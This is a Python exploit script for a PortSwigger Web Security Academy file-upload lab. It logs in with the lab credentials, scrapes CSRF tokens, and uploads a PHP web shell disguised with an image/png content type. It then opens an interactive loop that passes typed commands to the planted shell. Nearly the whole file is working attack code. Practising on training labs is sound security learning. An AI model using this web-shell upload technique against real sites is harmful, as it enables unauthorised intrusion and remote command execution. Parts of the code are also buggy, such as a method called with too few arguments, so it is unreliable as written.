import requests
import re
import payload_injection
import os
import dotenv
import json

session = requests.Session()
dotenv.load_dotenv()
proxy = {
    'http': os.getenv('PROXY_HTTP'),
    'https': os.getenv('PROXY_HTTPS')
}

class PortSwiggerExploit: 
    def __init__(self, url):
        self.url = url

    def csrf_token_extract(self, url):
        url_get = session.get(url).text
        csrf = re.search(r'name="csrf" value="([^"]+)"', url_get).group(1)
        if csrf:
            return csrf
        return None
    
    def file_upload(self, csrf, additional_stuff):
        file_location = os.getenv('FILE_TO_UPLOAD')
        file = {
            "avatar": ("web_shell.php", open(file_location, "rb"), additional_stuff)
        }
        data={
            'csrf': csrf,
            'user':'wiener'
        }
        file_upload_post = session.post(url=f"{self.url}/my-account/avatar", data=data, proxies=proxy, files=file, verify=False)
        return file_upload_post.status_code
    
    def exploit(self, status_code):
        if status_code == 200:
            print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
            while True:
                payload = input("Enter your payload: ") 
                if payload == "stop":
                    break
                file_upload_web_shell =  payload_injection.start_payload(f"{url}/files/avatars/web_shell.php", payload)
                print(file_upload_web_shell)
        else:
            print("Web shell could not spawn")

    def simple_file_upload(self):
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf)
        self.exploit(file_upload_post)

    def content_type_file_upload(self):
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf, "image/png")
        self.exploit(file_upload_post)

    def login(self):
        csrf_token = self.csrf_token_extract(f"{self.url}/login")
        if csrf_token != None:
            login_info = {
                "username": "wiener", #credentials given in website
                "password": "peter", #credentials given in website
                "csrf": csrf_token 
            }
            self.login_page_post = session.post(url=f"{self.url}/login", verify=False, proxies=proxy, data=login_info, allow_redirects=True)
            if self.login_page_post.status_code == 200:
                self.content_type_file_upload()
            else: print("Not successfull")
        else:
            print("csrf token not found")

url = "https://0ad600ab04daea9782eee73f00c700d1.web-security-academy.net"
start = PortSwiggerExploit(url)
start.login()